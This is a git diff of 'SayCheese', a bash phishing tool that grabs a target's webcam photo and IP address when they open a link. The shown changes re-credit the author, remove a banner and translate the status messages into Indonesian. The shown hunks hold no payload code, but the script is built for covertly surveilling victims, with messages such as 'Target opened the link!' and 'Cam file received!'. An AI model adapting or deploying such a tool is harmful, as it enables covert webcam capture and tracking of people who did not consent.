@@ -1,21 +1,13 @@
 #!/bin/bash
 # SayCheese v1.1
-# coded by: github.com/thelinuxchoice/saycheese
+# coded by: github.com/cbcbid/saycheese
 # If you use any part from this code, giving me the credits. Read the Lincense!
 
 trap 'printf "\n";stop' 2
 
 banner() {
 
-
-printf "\e[1;92m  ____              \e[0m\e[1;77m ____ _                          \e[0m\n"
-printf "\e[1;92m / ___|  __ _ _   _ \e[0m\e[1;77m/ ___| |__   ___  ___  ___  ___  \e[0m\n"
-printf "\e[1;92m \___ \ / _\` | | | \e[0m\e[1;77m| |   | '_ \ / _ \/ _ \/ __|/ _ \ \e[0m\n"
-printf "\e[1;92m  ___) | (_| | |_| |\e[0m\e[1;77m |___| | | |  __/  __/\__ \  __/ \e[0m\n"
-printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
-printf "\e[1;92m              |___/ \e[0m                                 \n"
-
-printf " \e[1;77m v1.1 coded by github.com/thelinuxchoice/saycheese\e[0m \n"
+printf " \e[1;77m v1.1 coded by github.com/cbcbid/saycheese\e[0m \n"
 
 printf "\n"
 
@@ -65,12 +57,12 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Menunggu Terget meng-Klik,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Si Dia telah membuka LINK!\n"
 catch_ip
 rm -rf ip.txt
 
@@ -79,7 +71,7 @@ fi
 sleep 0.5
 
 if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Foto Berhasil Direkam!\e[0m\n"
 rm -rf Log.log
 fi
 sleep 0.5
